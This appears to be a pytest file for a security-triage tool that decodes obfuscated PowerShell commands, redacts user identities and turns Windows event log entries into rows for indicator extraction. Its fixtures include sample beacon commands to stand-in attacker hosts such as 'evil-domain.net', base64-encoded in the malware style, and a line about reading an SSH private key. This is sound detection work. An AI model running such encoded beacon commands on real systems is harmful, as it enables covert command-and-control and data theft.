"""Reading real telemetry — the deterministic half, testable off Windows.

The Event Log call itself needs a Windows host, but everything that decides what
a row *says* is pure and is tested here: base64 expansion, identity redaction,
and the event-to-row mapping, against a message captured from the real
`Windows PowerShell` channel on 2026-08-31.
"""

from __future__ import annotations

import base64

import pytest

from org_a.agent import extract_indicator
from org_a.sources import (
    decode_encoded_commands,
    event_to_row,
    parse_spec,
    read_plain_file,
    redact_local_identity,
)


def encode(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


# --- base64: the indicator is hidden until the agent decodes it ---------------


def test_encoded_command_is_expanded_in_place():
    payload = "$c2 = 'https://secure-update-delivery.net/beacon'; iwr $c2"
    line = f"powershell.exe -NoProfile -EncodedCommand {encode(payload)}"
    decoded = decode_encoded_commands(line)
    assert "secure-update-delivery.net" in decoded
    assert "-EncodedCommand" in decoded, "the original command line is preserved too"


def test_the_indicator_is_unreachable_until_decoded():
    """The point of decoding: an obfuscated command line correlates with the
    same infrastructure seen in the clear elsewhere. Without this step it does
    not, and the campaign is missed."""
    payload = "iwr https://secure-update-delivery.net/beacon"
    line = f"powershell.exe -enc {encode(payload)}"
    assert extract_indicator({"detail": line}) is None
    assert (
        extract_indicator({"detail": decode_encoded_commands(line)})
        == "secure-update-delivery.net"
    )


@pytest.mark.parametrize("flag", ["-EncodedCommand", "-encodedcommand", "-enc", "-e"])
def test_every_spelling_of_the_flag_is_decoded(flag):
    line = f"powershell.exe {flag} {encode('iwr https://evil-domain.net/x')}"
    assert "evil-domain.net" in decode_encoded_commands(line)


def test_undecodable_base64_is_left_exactly_as_found():
    """Never guess: a blob that is not a command must survive untouched rather
    than be turned into mojibake the model would then reason about."""
    line = "powershell.exe -enc " + "!!!!not-base64-at-all!!!!"
    assert decode_encoded_commands(line) == line


def test_a_line_with_no_encoded_command_is_unchanged():
    line = "outbound TCP 443 to secure-update-delivery.net, parent=winword.exe"
    assert decode_encoded_commands(line) == line


# --- redaction: local identity must not reach the model ----------------------


def test_user_paths_are_redacted():
    line = r"C:\Users\kappo\Desktop\report.docx opened"
    assert "kappo" not in redact_local_identity(line)
    assert r"C:\Users\<user>" in redact_local_identity(line)


def test_posix_home_paths_are_redacted():
    assert "alice" not in redact_local_identity("/home/alice/.ssh/id_rsa read")


def test_redaction_does_not_eat_ordinary_paths():
    r"""Regression: an unanchored `DOMAIN\user` rule turned
    `...\v1.0\powershell.exe` into `...\v1.<domain>\<user>`, deleting the only
    part of a real Event Log line worth triaging. Redaction that removes the
    evidence is worse than none — it hides the failure, not the identity."""
    line = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile"
    assert redact_local_identity(line) == line


def test_named_identity_fields_are_redacted():
    line = "SubjectUserName=kappo ComputerName=DESKTOP-7H2K1 LogonType=3"
    redacted = redact_local_identity(line)
    assert "kappo" not in redacted
    assert "DESKTOP-7H2K1" not in redacted
    assert "LogonType=3" in redacted, "non-identifying fields must survive"


def test_redaction_keeps_the_indicator_intact():
    """Redaction must not destroy the thing correlation depends on."""
    line = r"C:\Users\kappo\tool.exe -> https://secure-update-delivery.net/beacon"
    redacted = redact_local_identity(line)
    assert extract_indicator({"detail": redacted}) == "secure-update-delivery.net"


# --- mapping a real Windows event to a row ------------------------------------

# Captured verbatim from the classic `Windows PowerShell` channel, event 403.
REAL_EVENT_MESSAGE = """Engine state is changed from Available to Stopped.

Details:
\tNewEngineState=Stopped
\tPreviousEngineState=Available

\tSequenceNumber=15

\tHostName=ConsoleHost
\tHostVersion=5.1.26200.7015
\tHostId=0f3e9a44-1b2c-4d5e-8f90-112233445566
\tHostApplication=C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand {blob}
\tEngineVersion=5.1.26200.7015
\tRunspaceId=6f8a1b2c-3d4e-5f60-7182-93a4b5c6d7e8"""


def real_event(payload: str) -> dict[str, object]:
    return {
        "TimeCreated": "2026-08-31T17:48:18Z",
        "Id": 403,
        "ProviderName": "PowerShell",
        "Message": REAL_EVENT_MESSAGE.format(blob=encode(payload)),
    }


def test_a_real_event_becomes_a_triageable_row():
    row = event_to_row(real_event("$c2='https://secure-update-delivery.net/x'; iwr $c2"))
    assert row["timestamp"] == "2026-08-31T17:48:18Z"
    assert row["source_process"] == "powershell.exe"
    assert row["event_type"] == "process_create"
    assert "secure-update-delivery.net" in row["detail"]


def test_the_row_carries_the_command_not_the_boilerplate():
    """HostApplication is the interesting part; RunspaceId and HostId are not,
    and every token sent for triage costs privacy."""
    row = event_to_row(real_event("iwr https://evil.net/x"))
    assert "RunspaceId" not in row["detail"]
    assert "Engine state is changed" not in row["detail"]


def test_end_to_end_a_real_event_yields_the_indicator():
    """The whole real-log path, minus the model: live event -> row -> indicator."""
    row = event_to_row(real_event("iwr https://secure-update-delivery.net/beacon"))
    assert extract_indicator(row) == "secure-update-delivery.net"


def test_an_event_with_no_command_line_falls_back_to_the_message():
    row = event_to_row(
        {"TimeCreated": "2026-08-31T17:00:00Z", "Id": 600, "Message": "Provider started."}
    )
    assert row["detail"] == "Provider started."
    assert row["event_type"] == "provider_lifecycle"


def test_a_missing_field_does_not_crash_the_mapping():
    assert event_to_row({}) == {
        "timestamp": "",
        "source_process": "powershell.exe",
        "event_type": "log_event",
        "detail": "",
    }


# --- source specs -------------------------------------------------------------


@pytest.mark.parametrize(
    "spec,expected",
    [
        ("jsonl:data/mock_log.jsonl", ("jsonl", "data/mock_log.jsonl")),
        ("winevent:Windows PowerShell", ("winevent", "Windows PowerShell")),
        ("file:/var/log/edr.log", ("file", "/var/log/edr.log")),
        ("data/mock_log.jsonl", ("jsonl", "data/mock_log.jsonl")),
    ],
)
def test_spec_parsing(spec, expected):
    assert parse_spec(spec) == expected


def test_a_bare_windows_path_is_a_path_not_a_source_kind():
    r"""`C:\logs\x.jsonl` must not be read as kind 'c'."""
    assert parse_spec(r"C:\logs\x.jsonl") == ("jsonl", r"C:\logs\x.jsonl")


def test_plain_file_source_splits_timestamp_from_the_event(tmp_path):
    path = tmp_path / "edr.log"
    path.write_text(
        "2026-08-31T09:14:02Z powershell.exe -> https://secure-update-delivery.net/x\n"
        "\n"
        "no timestamp on this one\n",
        encoding="utf-8",
    )
    rows = read_plain_file(path)
    assert len(rows) == 2, "blank lines are dropped"
    assert rows[0]["timestamp"] == "2026-08-31T09:14:02Z"
    assert extract_indicator(rows[0]) == "secure-update-delivery.net"
    assert rows[1]["timestamp"] == ""
